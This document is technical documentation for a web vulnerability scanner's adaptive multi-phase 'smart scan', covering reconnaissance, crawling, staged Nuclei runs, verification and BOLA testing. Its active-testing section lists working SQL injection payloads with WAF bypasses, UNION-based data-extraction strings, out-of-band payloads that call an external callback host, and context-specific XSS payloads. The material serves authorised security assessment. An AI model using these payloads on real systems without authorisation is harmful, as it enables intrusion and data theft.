# Smart Scan Workflow - Detailed Technical Documentation

This document provides a comprehensive breakdown of the smart scan workflow, including all phases, decision points, and the intelligence mechanisms that make it adaptive.

## Overview

The smart scan is an **adaptive, multi-phase vulnerability assessment** that makes intelligent decisions throughout execution based on signals from earlier phases. Unlike static scan profiles, smart scan dynamically adjusts its strategy based on what it discovers.

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                        SMART SCAN ARCHITECTURE (7 Phases)                    │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  ┌──────────┐    ┌──────────┐    ┌──────────┐    ┌──────────┐              │
│  │ Phase 0  │───▶│ Phase 1  │───▶│ Phase 2  │───▶│ Phase 3  │              │
│  │   Init   │    │  Recon   │    │Discovery │    │  Nuclei  │              │
│  └──────────┘    └──────────┘    └──────────┘    └──────────┘              │
│                        │               │               │                    │
│                        └───────────────┴───────────────┘                    │
│                                        │                                    │
│                                 ┌──────▼──────┐                             │
│                                 │   SIGNALS   │                             │
│                                 │  (Feedback) │                             │
│                                 └──────┬──────┘                             │
│                                        │                                    │
│  ┌──────────┐    ┌──────────┐    ┌─────▼────┐    ┌──────────┐              │
│  │ Phase 4  │───▶│ Phase 4b │───▶│ Phase 5  │───▶│ Phase 6  │              │
│  │  Active  │    │ Verify   │    │  BOLA    │    │ Advanced │              │
│  │(SQLi/XSS)│    │  Phase   │    │(IDOR)    │    │ Checks   │              │
│  └──────────┘    └──────────┘    └──────────┘    └──────────┘              │
│                                                                             │
│  Phase 0: Configuration, tuning options, active check enforcement           │
│  Phase 1: DNS, TLS, headers, tech fingerprinting, WAF detection (~30s)     │
│  Phase 2: HAR crawl, JS analysis, recursive fuzzing, endpoint discovery    │
│  Phase 3: 4-wave staged Nuclei with early stopping and signal extraction   │
│  Phase 4: DBMS-aware SQLi, context-aware XSS, DOM XSS analysis             │
│  Phase 4b: Verification phase - browser proofs, timing analysis            │
│  Phase 5: BOLA/IDOR testing with multi-user comparison                     │
│  Phase 6: NoSQL, LDAP, XPath, SSTI, JWT, OAuth, GraphQL, cache poisoning   │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## Phase 0: Initialization & Configuration

**Entry Point**: `scanner.py:run_scan()` with `smart_mode=True`

### Configuration Profile

When smart mode is enabled, the following settings are applied:

| Setting | Value | Purpose |
|---------|-------|---------|
| `discovery_scan_type` | `"smart"` | Enables recursive fuzzing |
| `budget_profile` | `balanced` by default | Resolves depth/time limits; can be `fast`, `balanced`, `thorough`, or `exhaustive` |
| `browser_crawl` | budget-controlled | Multi-page authenticated crawl |
| `active_checks` | `enabled` | XSS/SQLi testing |
| `nuclei` | `staged` | 4-wave adaptive scanning |
| `max_active` | budget-controlled | Active endpoint budget |

### Tuning Options

| Option | Default | With Flag | Effect |
|--------|---------|-----------|--------|
| `budget_profile` | `balanced` | `fast`, `thorough`, `exhaustive` | Controls depth/time budgets without changing enabled modules |
| `custom_budget` | none | JSON object/API or CLI budget flags | Overrides selected resolved limits such as `max_urls`, `browser_max_pages`, and `active_max_endpoints` |
| `no_early_stop` | `false` | `true` | Disables confidence-weighted early stopping in staged Nuclei |
| `thorough_params` | `false` | `true` | Legacy shortcut that promotes to the `thorough` budget when no explicit budget is provided |
| `oob_callback_url` | none | URL | OOB callback server for blind SQLi verification |

### Safety/Performance Limits

| Option | Default | Effect |
|--------|---------|--------|
| `smart_bola_max_endpoints` | budget-controlled (`100` in balanced smart) | Max endpoints for BOLA testing |
| `dom_xss_max_files` | 20 | Max JS files for DOM XSS analysis |
| `sqli_extract_max` | 3 | Max SQLi findings for data extraction |
| `oob_max_findings` | 3 | Max SQLi findings for OOB testing |

### Active Check Enforcement

Smart, full, and aggressive scan types **always** enable active checks. The `--public` flag is incompatible with these scan types:

```
smart + public     → ERROR (must use --deep instead)
full + public      → ERROR (must use --deep instead)
aggressive + public → ERROR (must use --deep instead)
```

This ensures these scan types always perform their intended comprehensive testing.

---

## Phase 1: Parallel Reconnaissance (~30 seconds)

Multiple reconnaissance tasks run concurrently:

### 1.1 DNS Analysis
```
├─ A/AAAA records
├─ MX records
├─ SPF record parsing
├─ DMARC policy analysis
├─ DNSSEC validation
└─ CAA records
```

### 1.2 TLS/SSL Analysis
```
├─ Certificate chain validation
├─ Key size and algorithm
├─ Expiration check
├─ OCSP stapling status
└─ Cipher suite analysis
```

### 1.3 HTTP Security Headers
```
├─ HSTS (max-age, includeSubDomains, preload)
├─ X-Frame-Options
├─ X-Content-Type-Options
├─ Content-Security-Policy (parsed and graded)
├─ Referrer-Policy
├─ COOP/COEP/CORP
└─ Permissions-Policy
```

### 1.4 Light Port Scan (Service Hints)
```
├─ Top 200 TCP ports (no scripts)
├─ Service/version hints for tech fingerprinting
└─ Feeds gRPC discovery candidates
```

### 1.5 Technology Fingerprinting
```
├─ Wappalyzer-style detection
├─ Response header analysis
├─ JavaScript library detection
├─ Framework identification
└─ CMS detection
```

### 1.5 WAF Detection
```
├─ Known WAF signatures
├─ Response behavior analysis
└─ Error page fingerprinting
```

**Output**: `early_techs[]` - List of detected technologies passed to Phase 3

---

## Phase 2: Intelligent Discovery (~2-5 minutes)

### 2.1 URL Discovery

**Function**: `smart_discovery()` in `discovery.py`

```python
DISCOVERY_CONFIG["smart"] = {
    "katana_depth": 4,
    "recursive_fuzzing": True,
    "parameter_discovery": True,
    "js_parsing": True,
    "browser_fallback": True,
    "max_urls": 1000
}
```

### 2.2 Discovery Sources

| Source | Method | Priority |
|--------|--------|----------|
| Katana crawl | Depth-4 crawl with JS rendering | High |
| Sitemap.xml | Parse all URLs | Medium |
| robots.txt | Extract disallowed paths | Medium |
| JavaScript bundles | Regex extraction of API endpoints | High |
| OpenAPI/Swagger | Schema parsing | High |
| GraphQL introspection | Query discovery | High |

### 2.3 Recursive Directory Fuzzing

```
Level 1: /api/
Level 2: /api/v1/, /api/users/, /api/admin/
Level 3: /api/v1/users/, /api/v1/admin/config/
```

**Prioritization Logic**:
```python
priority_paths = _prioritize_paths(current_level, signals)
# Higher priority:
# - API paths (/api/, /rest/, /graphql)
# - Paths matching SQL/XSS/auth signals
# - Admin/internal endpoints
```
Note: Initial discovery runs without nuclei signals; a post‑nuclei refinement pass uses signals to adapt recursive fuzzing depth and prioritization.

### 2.4 Browser-Based Crawl (Playwright)

```
├─ Max pages: 30
├─ Max depth: 4
├─ Captures:
│   ├─ XHR/Fetch API calls
│   ├─ Form submissions
│   ├─ WebSocket connections
│   └─ Dynamic endpoint discovery
└─ Authentication: Uses provided cookies/headers
```

**HAR Extraction (Smart mode)**:
- Parses browser network capture to extract endpoints, params (query/body/path), auth patterns, and WebSocket URLs
- Seeds active testing with real request shapes and observed parameter defaults
- Primary discovery signal for smart coverage metrics

### 2.5 JavaScript Bundle Analysis

Extracts hidden endpoints from JS code:
```javascript
// Patterns detected:
fetch("/api/v1/users")
axios.get("/api/admin")
$.ajax({url: "/internal/config"})
new WebSocket("wss://api.example.com")
```

**Output**:
- `all_urls[]` - All discovered URLs
- `api_endpoints[]` - API-specific endpoints
- `endpoints_with_params[]` - Endpoints with query/body parameters
- `forms[]` - Discovered forms

### 2.6 Coverage Tracking

**Class**: `CoverageMetrics` in `coverage_tracker.py`

The coverage tracker monitors what has been discovered vs. tested throughout the scan:

```python
@dataclass
class CoverageMetrics:
    # Endpoint coverage
    endpoints_discovered: int = 0
    endpoints_tested: int = 0
    endpoints_by_method: dict[str, int]  # GET: 45, POST: 12, ...

    # Parameter coverage
    params_discovered: int = 0
    params_tested: int = 0
    params_by_location: dict[str, int]  # query: 30, body: 15, path: 8

    # Template coverage (Nuclei)
    templates_run: int = 0
    templates_matched: int = 0

    # Auth coverage
    auth_states_tested: list[str]  # ["anonymous", "user1", "user2"]
```

**Coverage Metrics in Report** (top-level `smart_coverage` field):
```json
{
  "endpoints": {
    "discovered": 127,
    "tested": 89,
    "coverage": 0.701,
    "by_method": {"GET": 85, "POST": 35, "PUT": 5, "DELETE": 2}
  },
  "parameters": {
    "discovered": 234,
    "tested": 156,
    "coverage": 0.667,
    "by_location": {"query": 120, "body": 95, "path": 19}
  },
  "nuclei_templates": {
    "run": 1847,
    "matched": 23,
    "hit_rate": 0.012,
    "by_category": {}
  },
  "discovery_sources": ["har_network_capture", "url_crawl", "js_bundle_analysis"],
  "auth_states_tested": ["anonymous"]
}
```

**Note**: The report has two coverage-related fields at the top level:
- `coverage` - grade reliability info from `assess_scan_completeness()` (grade_reliable, issues, status)
- `smart_coverage` - CoverageTracker metrics shown above (endpoints, parameters, templates)

**Coverage Reporting**:
- Final report includes coverage metrics for transparency
- UI coverage panel displays endpoint/parameter/template coverage
- Low coverage can indicate incomplete discovery or rate limiting

---

## Phase 3: Staged Nuclei Vulnerability Scanning

### 3.1 Four-Wave Strategy

The staged approach progressively expands testing based on signals:

```
┌─────────────────────────────────────────────────────────────────┐
│                    NUCLEI WAVE STRATEGY                         │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Wave 1 (~60s)         Wave 2 (~120s)        Wave 3 (~300s)    │
│  ┌─────────────┐       ┌─────────────┐       ┌─────────────┐   │
│  │ Critical    │──────▶│ Signal-     │──────▶│ Injection   │   │
│  │ CVEs +      │       │ Based       │       │ Focused     │   │
│  │ Tech-       │       │ Expansion   │       │ (if signals)│   │
│  │ Specific    │       │             │       │             │   │
│  └─────────────┘       └─────────────┘       └─────────────┘   │
│        │                     │                     │            │
│        ▼                     ▼                     ▼            │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │              SIGNAL EXTRACTION & EARLY STOP             │   │
│  │  if weighted_score >= 12: STOP (unless disabled)        │   │
│  └─────────────────────────────────────────────────────────┘   │
│                              │                                  │
│                              ▼                                  │
│                       Wave 4 (~480s)                           │
│                       ┌─────────────┐                          │
│                       │ Deep Scan   │                          │
│                       │ (if         │                          │
│                       │ promising)  │                          │
│                       └─────────────┘                          │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**Yield-Based Budgets**:
- Each wave uses a time budget that adapts based on findings/minute
- High-yield waves extend the next budget; low-yield waves shrink it

### 3.2 Wave 1: Critical CVEs + Tech-Specific (~60s budget)

**Tags**: `["cve", "critical", "takeover", "rce", "default-login"]` + tech-specific

**Tech-to-Tag Mapping**:
```python
TECH_TO_NUCLEI_TAGS = {
    "react": ["react", "javascript", "js"],
    "django": ["django", "python"],
    "spring": ["spring", "java", "actuator"],
    "wordpress": ["wordpress", "wp"],
    "nginx": ["nginx"],
    # ... etc
}
```

**Rate limit**: 50 req/s
**Timeout**: 60s

### 3.3 Signal Extraction

After each wave, signals are extracted from findings:

```python
signals = {
    "sql_errors": False,        # SQLi indicators found
    "xss_reflection": False,    # XSS/reflection patterns
    "auth_issues": False,       # Auth/JWT/session issues
    "file_inclusion": False,    # LFI/RFI indicators
    "ssrf_potential": False,    # SSRF indicators
    "rce_potential": False,     # RCE indicators
    # Enhanced signals (new)
    "api_exposure": False,      # API documentation exposed
    "information_disclosure": False,  # Debug/error info
    "misconfig": False,         # Security misconfigurations
    "default_creds": False,     # Default credential issues
    "tech_specific": {},        # Technology-specific findings
    "high_value_targets": [],   # URLs with high-severity findings
    "signal_confidence": {},    # Confidence level per signal
    "critical_count": 0,        # Critical finding count
    "high_count": 0,            # High finding count
}
```

**Signal Detection Sources**:
1. Template IDs and tags
2. Finding titles and matcher names
3. CVSS scores
4. Response evidence patterns
5. Extracted results content

### 3.4 Early Stop Check

```python
def _should_early_stop(findings, signals):
    if no_early_stop:
        return False  # User disabled early stopping
    if signals["critical_count"] >= 3:
        return True
    if signals["high_count"] >= 5:
        return True
    if len(findings) >= 10 and (signals["critical_count"] >= 1 or signals["high_count"] >= 3):
        return True
    return False
```

### 3.5 Wave 2: Signal-Based Expansion (~120s budget)

**Base tags**: `["misconfig", "exposure", "auth"]`

**Signal-based additions**:
```python
if signals["sql_errors"]:
    tags += ["sqli", "mysql", "postgresql", "sqlite", "mssql", "oracle"]
if signals["xss_reflection"]:
    tags += ["xss", "dom-xss", "reflected-xss", "stored-xss"]
if signals["auth_issues"]:
    tags += ["default-login", "auth-bypass", "jwt", "session"]
if signals["file_inclusion"]:
    tags += ["lfi", "rfi", "path-traversal"]
```

**Rate limit**: 40 req/s
**Timeout**: 120s

### 3.6 Wave 3: Injection-Focused (~300s budget, conditional)

**Condition**: Only runs if `signals.sql_errors OR signals.xss_reflection OR signals.file_inclusion`

**Tags**: `["sqli", "xss", "ssti", "xxe", "ssrf", "lfi", "rce", "injection"]`

**Rate limit**: 30 req/s
**Timeout**: 300s

### 3.7 Wave 4: Deep Scan (~480s budget, conditional)

**Condition**: Only runs if `_has_promising_signals(signals, all_findings)` returns True

**Purpose**: Full coverage scan for remaining templates when signals suggest more vulnerabilities exist.

---

## Phase 4: Intelligent Active Testing

### 4.1 Run Configuration

**Function**: `run_smart_active_tests()` in `active_checks.py`

| Mode | SQLi Endpoints | SQLi Params | XSS Endpoints | XSS Params |
|------|---------------|-------------|---------------|------------|
| Default | 50 (per method) | 5 | 50 (per method) | 5 |
| Thorough | 100 (per method) | 10 | 100 (per method) | 10 |

**Note**: XSS endpoint limits apply separately to GET and POST/PUT/PATCH bodies (so totals can be ~2×).

### 4.2 Endpoint Prioritization

Based on signals, endpoints are sorted by vulnerability likelihood:

```python
if signals.get("sql_errors") or signals.get("auth_issues"):
    sql_priority_params = ["id", "user", "uid", "account", "login",
                          "query", "search", "filter"]
    prioritized_endpoints = sorted(
        endpoints,
        key=lambda e: count_matching_params(e, sql_priority_params),
        reverse=True
    )
```

**Synthetic Endpoint Policy**:
If discovery yields too few endpoints, synthetic `/api/*` targets are generated only when API hints exist
(HAR/API endpoints, `/api` paths, or manual endpoints) or when `--thorough-params` is set. Otherwise,
synthetic targets are skipped to reduce noise.

### 4.3 DBMS-Aware SQLi Testing

**Step 1: DBMS Detection**
```python
# Error-inducing payloads to fingerprint database
test_payloads = ["'", "''", '"', "\\", "1'1", "1 AND 1=1", "1'"]

# Detection patterns per DBMS
DBMS_ERROR_PATTERNS = {
    "mysql": [r"SQL syntax.*MySQL", r"Warning.*mysql_", ...],
    "postgresql": [r"PostgreSQL.*ERROR", r"pg_query\(\)", ...],
    "sqlite": [r"SQLite/JDBCDriver", r"sqlite3.OperationalError", ...],
    "mssql": [r"Driver.*SQL Server", r"OLE DB.*SQL Server", ...],
    "oracle": [r"ORA-\d{5}", r"Oracle.*Driver", ...]
}
```

**Step 2: DBMS-Specific Payloads**

Each DBMS has tailored payloads:

```python
DBMS_SQLI_PAYLOADS = {
    "mysql": [
        # Basic payloads
        ("' OR 1=1-- -", "boolean", "Boolean injection"),
        ("' AND SLEEP(2)-- -", "time_based", "Time-based blind"),
        # WAF bypass variants
        ("'/**/OR/**/1=1-- -", "waf_inline_comment", "Inline comment bypass"),
        ("' /*!50000OR*/ 1=1-- -", "waf_version_comment", "MySQL version conditional"),
        ("'%09OR%091=1-- -", "waf_tab_encode", "Tab character bypass"),
        # Error-based
        ("' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))-- -", "error_extractvalue", ...),
        ...
    ],
    "postgresql": [...],
    "sqlite": [...],
    "mssql": [...],
    "oracle": [...],
    "generic": [...]  # Cross-DBMS payloads
}
```

**Step 3: Response Analysis**
```python
is_vulnerable, evidence = _check_sqli_response(
    body_out,
    baseline_len,
    elapsed,
    technique,
    dbms_detected,
    status_code=status_code,
    baseline_status=baseline_status,
    baseline_elapsed=baseline_elapsed
)
```

### 4.4 SQLi Data Extraction Chaining (New)

After confirming SQLi, attempts to extract actual data:

```python
SQLI_EXTRACTION_PAYLOADS = {
    "mysql": {
        "version": "' UNION SELECT NULL,@@version,NULL-- -",
        "user": "' UNION SELECT NULL,user(),NULL-- -",
        "database": "' UNION SELECT NULL,database(),NULL-- -",
        "tables": "' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL FROM information_schema.tables...",
        "columns": "' UNION SELECT NULL,GROUP_CONCAT(column_name),NULL FROM information_schema.columns..."
    },
    # ... other DBMS
}
```

**Extraction Flow**:
```
1. Extract version (proof of exploitation)
2. Extract current user
3. Extract database name
4. Extract table names
5. For interesting tables (users, accounts, credentials):
   └─ Extract column names
```

### 4.5 Out-of-Band SQLi Detection (New)

For blind SQLi where in-band extraction fails:

```python
oob_payloads = {
    "mysql": [
        f"' AND LOAD_FILE('\\\\\\\\{callback_url}\\\\test')-- -",
    ],
    "mssql": [
        f"'; EXEC master..xp_dirtree '\\\\{callback_url}\\test'--",
    ],
    "oracle": [
        f"' UNION SELECT UTL_HTTP.REQUEST('http://{callback_url}/') FROM dual--",
    ],
    # ...
}
```

**Note**: Requires external callback server (e.g., Burp Collaborator) for verification.

### 4.6 Context-Aware XSS Testing

**Step 1: Reflection Detection**
```python
# Inject canary string
canary = f"xss{random.randint(10000, 99999)}test"
# Check if reflected in response
```

**Targets**:
- GET query params (classic reflection XSS)
- POST/PUT/PATCH body params (JSON/form) using discovered body templates/defaults

**Step 2: Context Analysis**
```python
def _detect_xss_context(body: str, canary: str) -> str:
    # Detect WHERE the canary appears
    contexts = [
        ("in_script", r"<script[^>]*>.*?" + canary),
        ("in_attribute", r'["\'][^"\']*' + canary),
        ("in_html", canary + r"[^<]*<"),
        ("in_comment", r"<!--.*?" + canary),
        ("in_angular", r"\{\{.*?" + canary),
        # ... more contexts
    ]
```

**Step 3: Context-Specific Payloads**

```python
CONTEXT_XSS_PAYLOADS = {
    "in_script": [
        ("';alert(1)//", "script_break", "Break out of string context"),
        ("';window['ale'+'rt'](1)//", "script_concat", "String concatenation WAF bypass"),
        ("';Function('alert(1)')()//", "script_function", "Function constructor"),
        ...
    ],
    "in_attribute": [
        ("' onmouseover=alert(1) x='", "attr_event", "Inject event handler"),
        ("' onmouseover=&#97;&#108;&#101;&#114;&#116;(1) x='", "attr_html_entity", "HTML entity bypass"),
        ...
    ],
    "in_html": [
        ("<script>alert(1)</script>", "script_tag", "Script tag injection"),
        ("<ScRiPt>alert(1)</ScRiPt>", "script_mixed_case", "Mixed case WAF bypass"),
        ("<svg/onload=alert(1)>", "svg_slash", "SVG with slash"),
        ...
    ],
    # Additional contexts: in_angular, in_event_handler, in_js_url,
    # in_url_path, in_css, in_svg, in_json
}
```

### 4.7 DOM-Based XSS Detection (New)

Static analysis of JavaScript for source-to-sink flows:

**Sources** (user-controlled input):
```python
DOM_XSS_SOURCES = [
    r"location\.href", r"location\.search", r"location\.hash",
    r"document\.URL", r"document\.referrer", r"document\.cookie",
    r"localStorage\.getItem", r"sessionStorage\.getItem",
    r"window\.name", r"postMessage", ...
]
```

**Sinks** (dangerous functions):
```python
DOM_XSS_SINKS = [
    # Critical
    (r"eval\s*\(", "critical", "eval"),
    (r"Function\s*\(", "critical", "Function constructor"),
    # High
    (r"\.innerHTML\s*=", "high", "innerHTML assignment"),
    (r"document\.write\s*\(", "high", "document.write"),
    (r"\$\s*\([^)]*\)\.html\s*\(", "high", "jQuery html()"),
    # React/Angular/Vue specific
    (r"dangerouslySetInnerHTML", "high", "React dangerouslySetInnerHTML"),
    (r"bypassSecurityTrust", "high", "Angular security bypass"),
    (r"v-html\s*=", "high", "Vue v-html directive"),
    ...
]
```

**Analysis Flow**:
```
1. Fetch main page, extract script URLs
2. For each JS file (max 20):
   └─ For each line:
       └─ If sink found:
           └─ Check if source within ±5 lines
               └─ If yes: Report potential DOM XSS
```

### 4.8 Verification Phase (High-Severity Proof)

**Function**: `verify_high_severity_findings()` in `verification_phase.py`

The verification phase runs after active tests to confirm high/critical findings with stronger proof:

```
┌─────────────────────────────────────────────────────────────────┐
│                    VERIFICATION WORKFLOW                         │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. Collect high/critical SQLi + XSS findings from Phase 4     │
│                          │                                      │
│                          ▼                                      │
│  2. For each finding, extract original request context:        │
│     - URL, method, params                                       │
│     - request_headers (auth, CSRF, custom headers)              │
│     - request_body (for POST/PUT/PATCH)                         │
│                          │                                      │
│                          ▼                                      │
│  3. Replay with proof technique:                                │
│     ┌─────────────────────────────────────────┐                │
│     │ SQLi: Statistical timing analysis       │                │
│     │   - Multiple baseline requests          │                │
│     │   - Time-based payload injection        │                │
│     │   - Statistical significance check      │                │
│     └─────────────────────────────────────────┘                │
│     ┌─────────────────────────────────────────┐                │
│     │ XSS: Headless browser execution         │                │
│     │   - Playwright loads page with payload  │                │
│     │   - Checks for alert/console/DOM proof  │                │
│     │   - Screenshots on confirmation         │                │
│     └─────────────────────────────────────────┘                │
│                          │                                      │
│  4. Update finding confidence based on result:                  │
│     - Verified: confidence = 0.95-0.99                          │
│     - Unverified: downgrade to medium, confidence = 0.65        │
│     - Skipped (missing context): keep original, no downgrade    │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**Request Context Preservation**:

Active checks now capture `request_headers` in findings:
```python
# SQLi findings (active_checks.py:2997-3003, 3136-3156)
request_headers = _headers_from_curl_args(auth_args)
if request_headers:
    finding["request_headers"] = request_headers

# XSS findings (active_checks.py:3786-3788)
request_headers = _headers_from_curl_args(auth_args)
if request_headers:
    finding["request_headers"] = request_headers
```

**Header Merge Logic** (`verification_phase.py:274-280`):
```python
# Start with auth headers from session
auth_args = get_auth_curl_args(auth_session)
header_map = _header_map_from_args(auth_args)

# Merge in original request headers from finding
request_headers = finding.get("request_headers") or finding.get("headers")
if isinstance(request_headers, dict):
    for name, value in request_headers.items():
        header_map[name.lower()] = (name, str(value))
```

**Verification Skipping**:

If a finding requires context that isn't captured (e.g., complex POST body, multipart form), verification is marked as skipped rather than failing:
```python
if missing_required_context:
    _mark_verification_skipped(finding, reason="Missing request body for POST endpoint")
    # Finding keeps original severity - no downgrade for missing context
```

**Verification Output**:

Each finding is updated with verification metadata:
- `verified`: boolean indicating if proof succeeded
- `verification_attempted`: boolean indicating if verification ran
- `verification_skipped`: boolean if skipped due to missing context
- `verification_reason`: reason string if skipped (e.g., "missing request body for SQLi timing verification")
- `confidence`: updated based on verification result and statistical significance

**Confidence Values** (see `statistical_timing_verification()` in `active_checks.py:39-127`):

| Verification Type | Condition | Confidence |
|------------------|-----------|------------|
| SQLi extraction | Data extracted | 0.95 |
| SQLi timing | p < 0.01, delay ≥ expected | 0.95 |
| SQLi timing | p < 0.05, delay ≥ 80% expected | 0.85 |
| SQLi timing | p < 0.10 | 0.70 |
| SQLi timing | p ≥ 0.10 (unverified) | 0.40 |
| SQLi timing (no scipy) | Confirmed | 0.75 |
| SQLi timing (no scipy) | Not confirmed | 0.30 |
| SQLi extraction | Failed (critical→high) | 0.75 |
| XSS | Unverified (critical→high) | 0.70 |
| SQLi timing | Unverified (critical→high) | 0.65 |
| XSS | Unverified (high→medium) | 0.65 |
| SQLi timing | Unverified (high→medium) | 0.60 |

---

## Phase 5: Smart IDOR/BOLA Testing

### 5.1 ID Pattern Discovery

Auto-discovers endpoints with ID parameters from crawled URLs:

```python
ID_PATTERNS = [
    (r'/(\d+)(?:/|$|\?)', 'numeric_id'),       # /users/123
    (r'/([a-f0-9]{24})(?:/|$|\?)', 'mongodb_id'),  # MongoDB ObjectID
    (r'/([a-f0-9-]{36})(?:/|$|\?)', 'uuid'),       # UUID v4
    (r'\?.*?id=(\d+)', 'query_numeric_id'),    # ?id=123
]
```

### 5.2 Test Generation

For each discovered ID pattern:
```
1. Extract original IDs from discovered URLs
2. Generate test IDs:
   - Original ID ± 1 (sequential)
   - Original ID + 10
   - Common IDs: 0, 1, 2, 100, 999, 9999
3. Test each ID with:
   - User 1 credentials (auth_session)
   - User 2 credentials (user2_session) - ONLY if user2 auth is provided
   - No credentials (always)
```

**Important**: Cross-user comparison tests only run when `user2_header` or `user2_cookies` is provided. Without user2 credentials, BOLA testing only checks for unauthenticated access.

### 5.3 Vulnerability Detection

```python
# Cross-user access detection
if user1_status == 200 and user2_status == 200:
    if user1_body == user2_body:  # Identical responses
        if has_user_data_indicators(user1_body):  # Contains user-specific data
            # BOLA candidate: require distinct-principal, ownership, impact,
            # and control receipts before promotion

# Unauthenticated access detection
if no_auth_status == 200 and len(no_auth_body) > 50:
    if not is_login_page(no_auth_body):
        # Unauthenticated-access candidate: verify the object is non-public,
        # sensitive, and distinguishable from a normal public response
```

### 5.4 Method Variation Testing

Tests whether dangerous HTTP methods are allowed:
```
For each endpoint with ID:
├─ Test PUT (modification)
├─ Test DELETE (deletion)
└─ Test PATCH (partial modification)

If a response suggests success: record a candidate and require before/after state or sensitive-data
proof plus an authorized control before promoting it to a finding.
```

---

## Phase 6: Additional Smart-Mode Checks

These advanced checks run in smart/full/aggressive modes (signal- and tech-gated):

| Check | Description | Trigger |
|-------|-------------|---------|
| NoSQL Injection | MongoDB/CouchDB injection | Always |
| LDAP Injection | LDAP filter injection | Always |
| XPath Injection | XML path injection | Always |
| SSTI | Template injection (Jinja2, Twig, etc.) | Always |
| HTTP Smuggling | Request smuggling detection | Always |
| JWT Vulnerabilities | Algorithm confusion, weak keys | If JWT detected |
| OAuth Vulnerabilities | Redirect URI, state bypass | If OAuth detected |
| GraphQL Vulnerabilities | Introspection, batching attacks | If GraphQL detected |
| Cache Poisoning | Web cache poisoning | If caching headers found |

Additional note: Active SSRF/command‑injection probes are **not** part of smart mode. They run only in full/aggressive scans with non‑safe exploit level **and** parameterized endpoints.

---

## Signal Flow Diagram

```
                    ┌─────────────────────────────────┐
                    │   Wave 1: CVE + Tech-Specific   │
                    │        (~60s budget)            │
                    └────────────────┬────────────────┘
                                     │
                                     ├─→ extract_signals_from_nuclei()
                                     │   {
                                     │     sql_errors, xss_reflection,
                                     │     auth_issues, file_inclusion,
                                     │     ssrf_potential, rce_potential,
                                     │     api_exposure, misconfig,
                                     │     tech_specific: {},
                                     │     high_value_targets: [],
                                     │     signal_confidence: {},
                                     │     critical_count, high_count
                                     │   }
                                     │
                                     ├─→ _should_early_stop()?
                                     │   YES → RETURN with findings
                                     │   NO  → continue
                                     │
                    ┌────────────────┴────────────────┐
                    │   Wave 2: Signal-Expansion      │
                    │   (~120s budget, adaptive tags) │
                    └────────────────┬────────────────┘
                                     │
                                     ├─→ Update signals
                                     ├─→ Early stop check?
                                     │   YES → RETURN
                                     │   NO  → continue
                                     │
                    ┌────────────────┴────────────────┐
                    │  Wave 3: Injection-Focused      │
                    │ (~300s budget, only if signals) │
                    └────────────────┬────────────────┘
                                     │
                                     ├─→ Early stop check?
                                     │   YES → RETURN
                                     │   NO  → continue
                                     │
                    ┌────────────────┴────────────────┐
                    │  Wave 4: Deep Scan (~480s)      │
                    │ (only if promising signals)     │
                    └────────────────┬────────────────┘
                                     │
                                     └─→ FINAL NUCLEI FINDINGS

                    ┌─────────────────────────────────┐
                    │  SIGNALS GUIDE ACTIVE TESTS:    │
                    │                                 │
                    │  sql_errors ──────→ Prioritize  │
                    │                    SQL params   │
                    │  xss_reflection ──→ XSS params  │
                    │  auth_issues ─────→ Auth tests  │
                    │  high_value_targets → Focus     │
                    │                      testing    │
                    └─────────────────────────────────┘
```

---

## Timing Characteristics

| Phase | Duration | Notes |
|-------|----------|-------|
| Initialization | ~1s | Config parsing |
| Phase 1: Recon | ~30s | Parallel tasks |
| Phase 2: Discovery | 2-5 min | Depends on site size |
| Phase 3 Wave 1 | ~60s budget | Critical CVEs |
| Phase 3 Wave 2 | ~120s budget | Signal-based |
| Phase 3 Wave 3 | ~300s budget | Injection (conditional) |
| Phase 3 Wave 4 | ~480s budget | Deep scan (conditional) |
| Phase 4: Active | 5-15 min | SQLi + XSS + DOM XSS |
| Verification (smart) | 0-3 min | XSS/SQLi proof (if high/critical) |
| Phase 5: Advanced | 3-5 min | NoSQL, JWT, etc. |
| **Total** | **20-50 min** | Variable based on signals |

With `no_early_stop` and `thorough_params`: **30-60+ min**

---

## API Usage Examples

### Basic Smart Scan
```bash
curl -X POST http://localhost:8080/scans \
  -H "Content-Type: application/json" \
  -d '{
    "target": "https://example.com",
    "options": {
      "scan_type": "smart"
    }
  }'
```

### Thorough Smart Scan (Pentesting)
```bash
curl -X POST http://localhost:8080/scans \
  -H "Content-Type: application/json" \
  -d '{
    "target": "https://example.com",
    "options": {
      "scan_type": "smart",
      "no_early_stop": true,
      "thorough_params": true
    }
  }'
```

### Authenticated Smart Scan with BOLA Testing
```bash
curl -X POST http://localhost:8080/scans \
  -H "Content-Type: application/json" \
  -d '{
    "target": "https://api.example.com",
    "options": {
      "scan_type": "smart",
      "auth_header": "Bearer user1_token",
      "user2_header": "Bearer user2_token",
      "no_early_stop": true
    }
  }'
```

### SQLi-Focused Smart Scan
```bash
curl -X POST http://localhost:8080/scans \
  -H "Content-Type: application/json" \
  -d '{
    "target": "https://api.example.com",
    "options": {
      "scan_type": "smart",
      "sqli": true,
      "auth_header": "Bearer token",
      "thorough_params": true
    }
  }'
```

### Smart Scan with OOB Callback (Blind SQLi)
```bash
curl -X POST http://localhost:8080/scans \
  -H "Content-Type: application/json" \
  -d '{
    "target": "https://api.example.com",
    "options": {
      "scan_type": "smart",
      "auth_header": "Bearer token",
      "oob_callback_url": "your-burp-collaborator.oastify.com"
    }
  }'
```

### Smart Scan with Custom Limits
```bash
curl -X POST http://localhost:8080/scans \
  -H "Content-Type: application/json" \
  -d '{
    "target": "https://api.example.com",
    "options": {
      "scan_type": "smart",
      "no_early_stop": true,
      "thorough_params": true,
      "smart_bola_max_endpoints": 50,
      "dom_xss_max_files": 30,
      "sqli_extract_max": 5
    }
  }'
```

---

## Key Files Reference

| File | Purpose |
|------|---------|
| `scanner/scanner.py:3035` | Main orchestrator with smart_mode logic |
| `scanner/scanner.py:2102` | `extract_signals_from_nuclei()` - Enhanced signal extraction |
| `scanner/scanner_tools/discovery.py` | `smart_discovery()` with recursive fuzzing |
